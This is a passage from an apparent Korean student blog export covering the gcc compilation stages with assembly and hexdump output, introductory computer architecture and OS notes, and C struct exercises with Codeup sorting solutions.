*__stream) __attribute__ ((__nonnull__ (1))); # 611 \u0026#34;/usr/include/stdio.h\u0026#34; 3 4 extern int fputc (int __c, FILE *__stream) __attribute__ ((__nonnull__ (2))); extern int putc (int __c, FILE *__stream) __attribute__ ((__nonnull__ (2))); ... # 3 \u0026#34;test.c\u0026#34; int main() { int n, num, sum = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;num); sum += num; } printf(\u0026#34;%d\u0026#34;, sum); return 0; } ... 어셈블리 1 2 ~/Documents/Coding via C v13.3.0-gcc ❯ gcc -S test.i -o test.s gcc의 -S 옵션을 사용하여 어셈블리 파일을 생성하였다.\n확인해보면 전처리된 파일에 비해 짧고 간단한 형태인 어셈블리어로 변환된 것을 확인할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 .file \u0026#34;test.c\u0026#34; .text .section .rodata .LC0: .string \u0026#34;%d\u0026#34; .text .globl main .type main, @function main: .LFB0: .cfi_startproc endbr64 pushq %rbp .cfi_def_cfa_offset 16 .cfi_offset 6, -16 movq %rsp, %rbp .cfi_def_cfa_register 6 subq $32, %rsp movq %fs:40, %rax movq %rax, -8(%rbp) xorl %eax, %eax movl $0, -16(%rbp) leaq -24(%rbp), %rax movq %rax, %rsi leaq .LC0(%rip), %rax movq %rax, %rdi movl $0, %eax call __isoc99_scanf@PLT movl $0, -12(%rbp) jmp .L2 .L3: leaq -20(%rbp), %rax movq %rax, %rsi leaq .LC0(%rip), %rax movq %rax, %rdi movl $0, %eax call __isoc99_scanf@PLT movl -20(%rbp), %eax addl %eax, -16(%rbp) addl $1, -12(%rbp) .L2: movl -24(%rbp), %eax cmpl %eax, -12(%rbp) jl .L3 movl -16(%rbp), %eax movl %eax, %esi leaq .LC0(%rip), %rax movq %rax, %rdi movl $0, %eax call printf@PLT movl $0, %eax movq -8(%rbp), %rdx subq %fs:40, %rdx je .L5 call __stack_chk_fail@PLT .L5: leave .cfi_def_cfa 7, 8 ret .cfi_endproc .LFE0: .size main, .-main .ident \u0026#34;GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0\u0026#34; .section .note.GNU-stack,\u0026#34;\u0026#34;,@progbits .section .note.gnu.property,\u0026#34;a\u0026#34; .align 8 .long 1f - 0f .long 4f - 1f .long 5 0: .string \u0026#34;GNU\u0026#34; 1: .align 8 .long 0xc0000002 .long 3f - 2f 2: .long 0x3 3: .align 8 4: 컴파일 1 2 ~/Documents/Coding via C v13.3.0-gcc ❯ gcc -c test.s -o test.o gcc의 -c 옵션을 사용하여 오브젝트 파일을 생성하였다.\n확인해보면 기계어 형태로 이루어진 바이너리 파일임을 확인할 수 있다.\n1 2 ❯ cat test.o ��UH��H�� dH�%(H�E�1��E�H�E�H��H�H�Ǹ��E��%H�E�H��H�H�Ǹ��E�E�E��E�9E�|ӋE��H�H�Ǹ��H�U�dH+%(t���%dGCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0GNU�zRx hexdump를 통해 실제 기계어로도 확인할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 ❯ hexdump test.o 0000000 457f 464c 0102 0001 0000 0000 0000 0000 0000010 0001 003e 0001 0000 0000 0000 0000 0000 0000020 0000 0000 0000 0000 03a0 0000 0000 0000 0000030 0000 0000 0040 0000 0000 0040 000e 000d 0000040 0ff3 fa1e 4855 e589 8348 20ec 4864 048b 0000050 2825 0000 4800 4589 31f8 c7c0 f045 0000 0000060 0000 8d48 e845 8948 48c6 058d 0000 0000 0000070 8948 b8c7 0000 0000 00e8 0000 c700 f445 0000080 0000 0000 25eb 8d48 ec45 8948 48c6 058d 0000090 0000 0000 8948 b8c7 0000 0000 00e8 0000 00000a0 8b00 ec45 4501 83f0 f445 8b01 e845 4539 00000b0 7cf4 8bd3 f045 c689 8d48 0005 0000 4800 00000c0 c789 00b8 0000 e800 0000 0000 00b8 0000 00000d0 4800 558b 64f8 2b48 2514 0028 0000 0574 00000e0 00e8 0000 c900 25c3 0064 4700 4343 203a 00000f0 5528 7562 746e 2075 3331 332e 302e 362d 0000100 6275 6e75 7574 7e32 3432 302e 2934 3120 0000110 2e33 2e33 0030 0000 0004 0000 0010 0000 0000120 0005 0000 4e47 0055 0002 c000 0004 0000 0000130 0003 0000 0000 0000 0014 0000 0000 0000 0000140 7a01 0052 7801 0110 0c1b 0807 0190 0000 0000150 001c 0000 001c 0000 0000 0000 00a7 0000 0000160 4500 100e 0286 0d43 0206 0c9e 0807 0000 0000170 0000 0000 0000 0000 0000 0000 0000 0000 0000180 0000 0000 0000 0000 0001 0000 0004 fff1 0000190 0000 0000 0000 0000 0000 0000 0000 0000 00001a0 0000 0000 0003 0001 0000 0000 0000 0000 00001b0 0000 0000 0000 0000 0000 0000 0003 0005 00001c0 0000 0000 0000 0000 0000 0000 0000 0000 00001d0 0008 0000 0012 0001 0000 0000 0000 0000 00001e0 00a7 0000 0000 0000 000d 0000 0010 0000 00001f0 0000 0000 0000 0000 0000 0000 0000 0000 0000200 001c 0000 0010 0000 0000 0000 0000 0000 0000210 0000 0000 0000 0000 0023 0000 0010 0000 0000220 0000 0000 0000 0000 0000 0000 0000 0000 0000230 7400 7365 2e74 0063 616d 6e69 5f00 695f 0000240 6f73 3963 5f39 6373 6e61 0066 7270 6e69 0000250 6674 5f00 735f 6174 6b63 635f 6b68 665f 0000260 6961 006c 0000 0000 002c 0000 0000 0000 0000270 0002 0000 0003 0000 fffc ffff ffff ffff 0000280 0039 0000 0000 0000 0004 0000 0005 0000 0000290 fffc ffff ffff ffff 0050 0000 0000 0000 00002a0 0002 0000 0003 0000 fffc ffff ffff ffff 00002b0 005d 0000 0000 0000 0004 0000 0005 0000 00002c0 fffc ffff ffff ffff 007b 0000 0000 0000 00002d0 0002 0000 0003 0000 fffc ffff ffff ffff 00002e0 0088 0000 0000 0000 0004 0000 0006 0000 00002f0 fffc ffff ffff ffff 00a1 0000 0000 0000 0000300 0004 0000 0007 0000 fffc ffff ffff ffff 0000310 0020 0000 0000 0000 0002 0000 0002 0000 0000320 0000 0000 0000 0000 2e00 7973 746d 6261 0000330 2e00 7473 7472 6261 2e00 6873 7473 7472 0000340 6261 2e00 6572 616c 742e 7865 0074 642e 0000350 7461 0061 622e 7373 2e00 6f72 6164 6174 0000360 2e00 6f63 6d6d 6e65 0074 6e2e 746f 2e65 0000370 4e47 2d55 7473 6361 006b 6e2e 746f 2e65 0000380 6e67 2e75 7270 706f 7265 7974 2e00 6572 0000390 616c 652e 5f68 7266 6d61 0065 0000 0000 00003a0 0000 0000 0000 0000 0000 0000 0000 0000 * 00003e0 0020 0000 0001 0000 0006 0000 0000 0000 00003f0 0000 0000 0000 0000 0040 0000 0000 0000 0000400 00a7 0000 0000 0000 0000 0000 0000 0000 0000410 0001 0000 0000 0000 0000 0000 0000 0000 0000420 001b 0000 0004 0000 0040 0000 0000 0000 0000430 0000 0000 0000 0000 0268 0000 0000 0000 0000440 00a8 0000 0000 0000 000b 0000 0001 0000 0000450 0008 0000 0000 0000 0018 0000 0000 0000 0000460 0026 0000 0001 0000 0003 0000 0000 0000 0000470 0000 0000 0000 0000 00e7 0000 0000 0000 0000480 0000 0000 0000 0000 0000 0000 0000 0000 0000490 0001 0000 0000 0000 0000 0000 0000 0000 00004a0 002c 0000 0008 0000 0003 0000 0000 0000 00004b0 0000 0000 0000 0000 00e7 0000 0000 0000 00004c0 0000 0000 0000 0000 0000 0000 0000 0000 00004d0 0001 0000 0000 0000 0000 0000 0000 0000 00004e0 0031 0000 0001 0000 0002 0000 0000 0000 00004f0 0000 0000 0000 0000 00e7 0000 0000 0000 0000500 0003 0000 0000 0000 0000 0000 0000 0000 0000510 0001 0000 0000 0000 0000 0000 0000 0000 0000520 0039 0000 0001 0000 0030 0000 0000 0000 0000530 0000 0000 0000 0000 00ea 0000 0000 0000 0000540 002c 0000 0000 0000 0000 0000 0000 0000 0000550 0001 0000 0000 0000 0001 0000 0000 0000 0000560 0042 0000 0001 0000 0000 0000 0000 0000 0000570 0000 0000 0000 0000 0116 0000 0000 0000 0000580 0000 0000 0000 0000 0000 0000 0000 0000 0000590 0001 0000 0000 0000 0000 0000 0000 0000 00005a0 0052 0000 0007 0000 0002 0000 0000 0000 00005b0 0000 0000 0000 0000 0118 0000 0000 0000 00005c0 0020 0000 0000 0000 0000 0000 0000 0000 00005d0 0008 0000 0000 0000 0000 0000 0000 0000 00005e0 006a 0000 0001 0000 0002 0000 0000 0000 00005f0 0000 0000 0000 0000 0138 0000 0000 0000 0000600 0038 0000 0000 0000 0000 0000 0000 0000 0000610 0008 0000 0000 0000 0000 0000 0000 0000 0000620 0065 0000 0004 0000 0040 0000 0000 0000 0000630 0000 0000 0000 0000 0310 0000 0000 0000 0000640 0018 0000 0000 0000 000b 0000 0009 0000 0000650 0008 0000 0000 0000 0018 0000 0000 0000 0000660 0001 0000 0002 0000 0000 0000 0000 0000 0000670 0000 0000 0000 0000 0170 0000 0000 0000 0000680 00c0 0000 0000 0000 000c 0000 0004 0000 0000690 0008 0000 0000 0000 0018 0000 0000 0000 00006a0 0009 0000 0003 0000 0000 0000 0000 0000 00006b0 0000 0000 0000 0000 0230 0000 0000 0000 00006c0 0034 0000 0000 0000 0000 0000 0000 0000 00006d0 0001 0000 0000 0000 0000 0000 0000 0000 00006e0 0011 0000 0003 0000 0000 0000 0000 0000 00006f0 0000 0000 0000 0000 0328 0000 0000 0000 0000700 0074 0000 0000 0000 0000 0000 0000 0000 0000710 0001 0000 0000 0000 0000 0000 0000 0000 0000720 링킹 1 2 ~/Documents/Coding via C v13.3.0-gcc ❯ gcc test.o -o test gcc의 -o 옵션을 사용하여 실행 파일을 생성하였다.\n실행해보면 잘 실행되는 것을 확인할 수 있다.\n1 2 3 4 5 6 7 8 ~/Documents/Coding via C v13.3.0-gcc ❯ ./test 4 1 2 3 4 10 Dreamhack Beginners 학습 ","date":"2025-05-13T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EC%BB%B4%ED%93%A8%ED%84%B0-%EA%B5%AC%EC%A1%B0-2%EC%B0%A8%EC%8B%9C/","title":"Layer7 컴퓨터 구조 2차시"},{"content":"컴퓨터 구조 배우는 이유 앞으로의 리버스 엔지니어링, 시스템 해킹을 학습하기 위해서는 컴퓨터가 어떤 구조로 이루어져 있는지, 어느 부분에서 취약점이 발생할 수 있는지 명확히 이해하고 있어야 한다.\nISA (명령어 집합 구조) 명령어 집합 구조는 간단히 말하면 CPU가 이해할 수 있는 기계어 명령어의 집합이다.\n소프트웨어의 명령어 집합을 ISA에 맞게 CPU가 이해해서 하드웨어단에서 실행되는 것이다.\n명령어 집합 구조는 명령어 길이가 일정한지에 따라 가변길이CISC(Complex Instuction Set Computer))와 고정길이(RISC(Reduced Instruction Set Computer))로 분류할 수 있다.\nISA 종류 대표적인 두 가지만 알아보도록 하겠다.\nx86, x86-64 고성능 프로세서를 설계하기 위해 사용한다. 많은 전력이 필요하고 발열이 심하기 때문에 냉각장치의 공간을 확보할 수 있는 데스크탑이나 랩탑에 사용된다. (가변길이)\nARM 저전력, 고효율 프로세서를 설계하기 위해 사용한다. 발열 문제에 민감한 스마트폰이나 임베디드 기기에 사 용된다. (고정길이)\nCPU (중앙 처리 장치) 프로그램의 연산과 제어를 담당하는 하드웨어이다. ALU, Register 등으로 구성된다.\nALU (산술 논리 장치) 산술 연산: 덧셈, 뺄셈, 곱셈, 나눗셈 등을 수행한다\n논리 연산: AND, OR, NOT, XOR 등의 논리 연산을 수행한다. 비교 연산: 두 값의 크기를 비교하여 어느 것이 더 큰지, 같은지, 작은지 등을 판단한다. 데이터 처리: 레지스터에서 데이터를 가져와 연산을 수행하고 결과를 레지스터에 저장한다.\nRegister CPU의 빠른 데이터 처리를 돕기 위해 사용되는 임시저장공간\n대표적인 레지스터의 종류 :\nPC (Program Counter) : 다음 명령어의 주소를 가지고 있는 레지스터\nAC (Accumulator) : 연산 결과 데이터를 일시적으로 저장하는 레지스터\nIR (Instruction Register) : 현재 실행 중인 명령어가 저장되어 있는 레지스터\nMAR (Memory Address Register) : PC 에 저장된 명령어 주소가 사용되기 전에 일시적으로 저장되는 주소 레지스터\nMBR (Memory Buffer Register) : 기억장치에 저장될 데이터 혹은 읽혀진 데이터가 일시적으로 저장되는 버퍼 레지스터\nMemory (기억장치) 컴퓨터에 필요한 데이터를 저장하는 장치\n용도에 따라 주기억장치와 보조기억장치로 분류한다.\n주기억장치 (RAM) 필요한 데이터를 보조기억장치에서 불러와 임시로 저장한다.\n예 ) 컴퓨터의 전원을 켜면 SSD에서 RAM으로 운영체제를 불러온다.\n컴퓨터의 전원이 꺼지면 주기억장치의 데이터가 사라지는 휘발성 메모리다.\n보조기억장치 (HDD, SSD) 주기억장치가 불러올 데이터를 장기적으로 저장한다.\n컴퓨터의 전원이 꺼져도 보조기억장치의 데이터가 사라지지 않는 비휘발성 메모리다.\nByte Ordering 메모리의 연속적으로 저장되는 데이터의 경우에는 정렬되는 방식이 각각 다른데, 빅 엔디안과 리틀 엔디안으로 나뉜다.\n빅 엔디안 큰 바이트부터 메모리의 낮은 주소부터 저장한다.\n일반적인 컴퓨터의 CPU에서는 사용되지 않는다.\n예 ) 0x72831923 -\u0026gt; | 0x72 | 0x83 | 0x19 | 0x23 |\n리틀 엔디안 작은 바이트부터 메모리의 낮은 주소부터 저장한다.\n일반적인 컴퓨터의 CPU에서 사용된다.\n예 ) 0x72831923 -\u0026gt; | 0x23 | 0x19 | 0x83 | 0x72 |\n인코딩 데이터를 특정한 형식으로 변환(암호화)한다.\n디코딩 인코딩(암호화)된 데이터를 원래 값으로 변환(복호화)한다.\n운영체제 (OS) Operating System의 약자로, 하드웨어의 자원을 효율적으로 관리하도록 하는 시스템이다.\n예 ) 메모리 공간을 효율적으로 사용하도록 분배\n운영체제는 크게 쉘과 커널로 구성된다.\n사용자가 애플리케이션에 명령어를 입력하면 그 명령을 쉘이 해석하여 커널에 전달하고 커널에 하드웨어를 관리하도록 한다.\n쉘 (Shell) 운영체제와 상호작용할 수 있도록 하는 명령 줄 인터페이스다. 명령어를 입력받으면 명령어를 해석하여 커널에 전달한다.\n쉘 종류 sh : 최초의 유닉스 쉘로 스크립트를 지원한다. 기능이 별로 없다. bash : sh의 확장 버전으로 mv, cp, rm, touch, ls, mkdir, cd, rmdir 등의 명령어 들이 추가되었다. zsh : 맞춤법 검사, 로그인 감시, 자동 생성, 플러그인 및 테마가 지원된다. fish : Friendly Interatice SHell, 친근하고 인터랙티브한 기능들이 지원된다. 커널 (Kernel) 운영체제의 핵심적인 역할을 하는 소프트웨어다. 하드웨어의 자원을 프로세스에 분배하고, 프로세스 제어, 메모리 제어, 시스템 콜 등 하드웨어에 직접적인 작업을 커널이 수행한다.\n운영체제 종류 크게 분류해보자면 UNIX 기반의 운영체제와 아닌 것으로 나눌 수 있다.\nWindows를 제외하면 현대 대부분의 운영체제는 UNIX 운영체제를 기반으로 하고 있다.\n그 중 Linux의 경우에는 UNIX를 계승한 오픈소스 운영체제로 Ubuntu, Arch Linux 등 다양한 배포판이 있고, 커스터마이징이 자유로워 다양한 환경에 사용된다는 장점이 있다.\n외에는 macOS, iOS, AndroidOS 등이 있다.\nCLI (Command Line Interface) 명령 줄로 컴퓨터와 상호작용하여 동작하는 인터페이스다.\nLinux나 서버 용도로 사용하는 운영체제의 경우에 자주 사용된다.\nGUI (Graphic User Interface) 그래픽으로 상호작용하여 동작하는 인터페이스다.\nWindows나 macOS와 같은 운영체제에서 대부분의 작업에서 사용한다.\n리눅스 명령어 cd : 디렉토리 변경\ncat : 파일 읽기\nls : 디렉토리 내 리스트 출력\npwd : 현재 디렉토리 출력\n이 외에도 다양한 명령어가 있다.\n과제 리눅스에서 자기 이름 폴더 만들고 C언어 소스코드 파일 만들기 및 과정 정리\n과정 mkdir 명령어로 디렉토리를 생성한 뒤, 해당 디렉토리로 이동하였다.\n1 2 3 4 5 ~ ❯ mkdir t43w00 ~ ❯ cd t43w00 vi 명령어로 vim 에디터를 사용하여 c 코드 파일을 생성 및 편집하였다.\n1 2 ~/t43w00 via C v13.3.0-gcc took 8s ❯ vi test.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34; ` \\n\u0026#34;); printf(\u0026#34; /h: \\n\u0026#34;); printf(\u0026#34; +ddd: \\n\u0026#34;); printf(\u0026#34; `oddddd: \\n\u0026#34;); printf(\u0026#34; .yddddddd/ \\n\u0026#34;); printf(\u0026#34; -hddddddddd/ \\n\u0026#34;); printf(\u0026#34; :hddddddddddy` \\n\u0026#34;); printf(\u0026#34; /ddddddddddds` \\n\u0026#34;); printf(\u0026#34; `oddddddddddd+` \\n\u0026#34;); printf(\u0026#34; `sddddddddddh: \\n\u0026#34;); printf(\u0026#34; .yddddddddddh- - \\n\u0026#34;); printf(\u0026#34; -hdddddddddds. `omy` \\n\u0026#34;); printf(\u0026#34; /dddddddddddo` `sdmMd- \\n\u0026#34;); printf(\u0026#34; +ddddddddddd/ -hddmMMN/ \\n\u0026#34;); printf(\u0026#34; `oddddddddddh: :hdddmMMMMo` \\n\u0026#34;); printf(\u0026#34; .yddddddddddy. +dddddmMMMMMh. \\n\u0026#34;); printf(\u0026#34; .hdddddddddds` `oddddddmMMMMMMm- \\n\u0026#34;); printf(\u0026#34; :ddddddddddd+ .ydddddddmMMMMMMMN/ \\n\u0026#34;); printf(\u0026#34; /ddddddddddd: -hddddddddhNMMMMMMMMs` \\n\u0026#34;); printf(\u0026#34; oddddddddddh- /dddddddddo`-mMMMMMMMMd. \\n\u0026#34;); printf(\u0026#34; `sddddddddddy` oddddddddd/ `hMMMMMMMMN: \\n\u0026#34;); printf(\u0026#34; .yddddddddddo `yddddddddh. oMMMMMMMMM+ \\n\u0026#34;); printf(\u0026#34; -hdddddddddd/ `hddddddddo` :NMMMMMMMMy` \\n\u0026#34;); printf(\u0026#34; /ddddddddddd- `dddddddd/ .dMMMMMMMMm. \\n\u0026#34;); printf(\u0026#34; +ddddddddddy. `ddddddh. sMMMMMMMMN/ \\n\u0026#34;); printf(\u0026#34; `sdddddddddds` `ddddds` /NMMMMMMMMs \\n\u0026#34;); printf(\u0026#34; `ydddddddddd+ `dddd/ .dMMMMMMMMh. \\n\u0026#34;); printf(\u0026#34; -hdddddddddd: `ddh- `sMMMMMMMMm- \\n\u0026#34;); printf(\u0026#34; :hdddddddddh- `ds` +NMMMMMMMN+ \\n\u0026#34;); printf(\u0026#34; /ddddddddddy. `.-/ -mMMMMMMMMy` \\n\u0026#34;); printf(\u0026#34; `oddddddddddo` `.-:/+sydmmd- `yMMMMMMMMd. \\n\u0026#34;); printf(\u0026#34; `sdddddddddds:/+sydmmNNMMMMMMMm- `oNMMMMMMMm: \\n\u0026#34;); printf(\u0026#34; .ydddddddddmNNMMMMMMMMMMMMMNNmy. :mMMMMMMMNo \\n\u0026#34;); printf(\u0026#34; -hdddddddddmNMMMMMMNNNNmmdhys+. .hMMMMMMMMy` \\n\u0026#34;); printf(\u0026#34; /ddddddddddmNNNmmmmdhyso/-.`` `sMMMMMMMMd- \\n\u0026#34;); printf(\u0026#34; +ddddddddddddddhyo+:-.` /NMMMMMMMN/ \\n\u0026#34;); printf(\u0026#34; :ssssssssssso/-.` -dMMMMMMMMs` \\n\u0026#34;); printf(\u0026#34; `sMMMMMMMMh. \\n\u0026#34;); printf(\u0026#34; +NMMMMMMMm: \\n\u0026#34;); printf(\u0026#34; -mMMMMMMMN+ \\n\u0026#34;); printf(\u0026#34; `yMMMMMMMMs\\n\u0026#34;); printf(\u0026#34; oNMMMMMMN\\n\u0026#34;); printf(\u0026#34; :mMMMMMN\\n\u0026#34;); printf(\u0026#34; .hMMMMM\\n\u0026#34;); printf(\u0026#34; sMMMM\\n\u0026#34;); printf(\u0026#34; /NMM\\n\u0026#34;); printf(\u0026#34; .dM\\n\u0026#34;); printf(\u0026#34; `y\\n\u0026#34;); return 0; } vi 에디터 내의 :wq 명령을 통해 저장 및 종료하였다.\ngcc로 컴파일한 뒤 실행하였다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 ~/t43w00 via C v13.3.0-gcc ❯ gcc -o test test.c ~/t43w00 via C v13.3.0-gcc ❯ ./test ` /h: +ddd: `oddddd: .yddddddd/ -hddddddddd/ :hddddddddddy` /ddddddddddds` `oddddddddddd+` `sddddddddddh: .yddddddddddh- - -hdddddddddds. `omy` /dddddddddddo` `sdmMd- +ddddddddddd/ -hddmMMN/ `oddddddddddh: :hdddmMMMMo` .yddddddddddy. +dddddmMMMMMh. .hdddddddddds` `oddddddmMMMMMMm- :ddddddddddd+ .ydddddddmMMMMMMMN/ /ddddddddddd: -hddddddddhNMMMMMMMMs` oddddddddddh- /dddddddddo`-mMMMMMMMMd. `sddddddddddy` oddddddddd/ `hMMMMMMMMN: .yddddddddddo `yddddddddh. oMMMMMMMMM+ -hdddddddddd/ `hddddddddo` :NMMMMMMMMy` /ddddddddddd- `dddddddd/ .dMMMMMMMMm. +ddddddddddy. `ddddddh. sMMMMMMMMN/ `sdddddddddds` `ddddds` /NMMMMMMMMs `ydddddddddd+ `dddd/ .dMMMMMMMMh. -hdddddddddd: `ddh- `sMMMMMMMMm- :hdddddddddh- `ds` +NMMMMMMMN+ /ddddddddddy. `.-/ -mMMMMMMMMy` `oddddddddddo` `.-:/+sydmmd- `yMMMMMMMMd. `sdddddddddds:/+sydmmNNMMMMMMMm- `oNMMMMMMMm: .ydddddddddmNNMMMMMMMMMMMMMNNmy. :mMMMMMMMNo -hdddddddddmNMMMMMMNNNNmmdhys+. .hMMMMMMMMy` /ddddddddddmNNNmmmmdhyso/-.`` `sMMMMMMMMd- +ddddddddddddddhyo+:-.` /NMMMMMMMN/ :ssssssssssso/-.` -dMMMMMMMMs` `sMMMMMMMMh. +NMMMMMMMm: -mMMMMMMMN+ `yMMMMMMMMs oNMMMMMMN :mMMMMMN .hMMMMM sMMMM /NMM .dM `y ","date":"2025-05-11T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-%EC%BB%B4%ED%93%A8%ED%84%B0-%EA%B5%AC%EC%A1%B0-1%EC%B0%A8%EC%8B%9C/","title":"Layer7 컴퓨터 구조 1차시"},{"content":"수업 내용 정리 구조체란? 서로 다른 자료형을 갖는 자료들의 집합이다. 배열과 달리 같은 자료형이 아닌 서로 다른 자료형을 사용할 수 있다는 것이 특징이다.\n선언 방법 아래와 같이 선언할 수 있다.\n1 2 3 4 struct structure { int number; char string[10]; }; 만약 선언한 구조체 변수를 사용하려면 아래와 같이 선언할 수 있다.\n1 2 3 4 5 6 struct structure { int number; char string[10]; }; struct structure s1, s2, s3; 혹은 구조체 선언과 같이 구조체 변수 또한 선언할 수 있다.\n1 2 3 4 5 struct structure { int number; char string[10]; } s1, s2, s3; 구조체 멤버 초기화 구조체는 초기값이 주어지지 않은 경우 그 값이 0으로 초기화된다.\n구조체 멤버의 활용 구조체 멤버로는 배열이나 포인터와 같은 변수도 포함할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 struct student { char name[20]; char *intro; } sunrin; int main() { sunrin.intro = (char *)malloc(80); strcpy(sunrin.name, \u0026#34;Sunrin Kim\u0026#34;); gets(sunrin.intro); printf(\u0026#34;%s\\n%s\u0026#34;, sunrin.name, sunrin.intro); free(sunrin.intro); return 0; } typedef를 이용한 형 재정의 typedef를 이용하여 형을 재정의하면 비교적 간단하게 자료형을 선언할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 struct student { char name[20]; int age; } sunrin; typedef struct student stu; int main() { stu s1 = {\u0026#34;sunrin\u0026#34;, 17}; printf(\u0026#34;이름 : %s\\n\u0026#34;, s1.name); printf(\u0026#34;나이 : %d\u0026#34;, s1.age); return 0; } 선언과 동시에 재정의 또한 가능하다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 typedef struct student { char name[20]; int age; } stu; typedef struct student stu; int main() { stu s1 = {\u0026#34;sunrin\u0026#34;, 17}; printf(\u0026#34;이름 : %s\\n\u0026#34;, s1.name); printf(\u0026#34;나이 : %d\u0026#34;, s1.age); return 0; } 구조체 배열 구조체 배열을 통해 하나의 연속된 구조체 변수를 선언할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 typedef struct student { int num; char name[20]; int score; } stu; int main() { stu s1[3] = { {10100, \u0026#34;Kim\u0026#34;, 100}, {10200, \u0026#34;Lee\u0026#34;, 74}, {10300, \u0026#34;Pak\u0026#34;, 86} }; for (int i = 0; i \u0026lt; 3; i++) { printf(\u0026#34;%d %s %d점\\n\u0026#34;, s1[i].num, s1[i].name, s1[i].score); } return 0; } 구조체 포인터와 -\u0026gt; 연산자 구조체 포인터에 -\u0026gt; 연산자를 사용하면 바로 해당 구조체의 멤버에 접근할 수 있다.\n1 2 3 4 5 6 7 8 9 10 11 12 13 typedef struct student { int num; char name[20]; } stu; int main() { stu s1 = {10100, \u0026#34;Kim\u0026#34;}; stu *ptr = \u0026amp;s1; printf(\u0026#34;%d %s\\n\u0026#34;, ptr-\u0026gt;num, ptr-\u0026gt;name); return 0; } Codeup 문제 정리 1805 | 입체기동장치 생산공장 문제 링크\n문제 입체기동장치 생산공장에서는 거인들을 물리치기 위한 기계가 생산되고 있습니다.\n이 공장을 운영하는 에렌은 입체기동장치(1100)의 식별번호(1100)와 가스 보유량(0~10000)을 같이 관리하려고 합니다.\n하지만, 식별번호를 정렬할 때 가스 보유량이 뒤죽박죽 되어 버려 골머리를 앓고 있습니다.\n에렌을 남몰래 좋아하고 있던 미카사는 에렌이 스트레스성 탈모로 잔머리가 모두 빠지기 전에 이 문제를 해결해주려 합니다.\n미카사가 에렌의 스트레스성 탈모를 막을 수 있도록 프로그램을 작성하세요.\n식별번호가 한번 정해지면 그 입체기동장치의 가스 보유량은 정렬되더라도 변하지 않아야 합니다.\n풀이 먼저 식별번호와 가스 보유량을 포함한 구조체 배열을 선언한 뒤, 입체기동장치의 개수만큼 반복문을 통해 입력받았다.\n식별 번호 순으로 정렬한 뒤 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;stdio.h\u0026gt; struct VME { int num; int gas; } a[100], tmp; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;a[i].num, \u0026amp;a[i].gas); } for (int i = 0; i \u0026lt; n; i++) { for (int j = i; j \u0026lt; n; j++) { if (a[i].num \u0026gt; a[j].num) { tmp = a[i]; a[i] = a[j]; a[j] = tmp; } } } for (int i = 0; i \u0026lt; n; i++) { printf(\u0026#34;%d %d\\n\u0026#34;, a[i].num, a[i].gas); } return 0; } 4012 | 석차 계산 문제 링크\n문제 정렬되지 않은 학생들의 임의의 점수를 입력하여 석차를 계산하는 프로그램을 작성하시오. 점수는 동점이 있을 수 있으며, 이러한 경우 같은 석차로 처리한다. 예를 들어 5명의 점수 100, 90, 76, 60, 90이 입력되었다면 석차는 2등이 2명이고 3등은 없다. (단, 점수가 가장 높은 학생을 1등으로 한다.)\n풀이 먼저 score와 rank라는 멤버를 가진 구조체 배열 stu와 이를 정렬할 복사본 sorted를 선언하였다.\n두 배열에 n 만큼 점수를 입력받고, sorted 배열에는 점수에 따라 정렬하였다.\n이후 sorted 배열에 인덱스를 rank에 저장하고 stu 배열과 sorted 배열 중 같은 점수를 가진 구조체는 sorted의 rank를 stu의 rank에 복사해주었다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #include \u0026lt;stdio.h\u0026gt; typedef struct { int score; int rank; } student; int main() { student stu[200], sorted[200]; int n, tmp; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;stu[i].score); sorted[i].score = stu[i].score; } for (int i = 0; i \u0026lt; n; i++) { for (int j = i; j \u0026lt; n; j++) { if (sorted[j].score \u0026gt; sorted[i].score) { tmp = sorted[j].score; sorted[j].score = sorted[i].score; sorted[i].score = tmp; } } } for (int i = 0; i \u0026lt; n; i++) { sorted[i].rank = i + 1; } for (int i = 0; i \u0026lt; n; i++) { if (sorted[i].score == sorted[i+1].score) { sorted[i+1].rank = sorted[i].rank; } } for (int i = 0; i 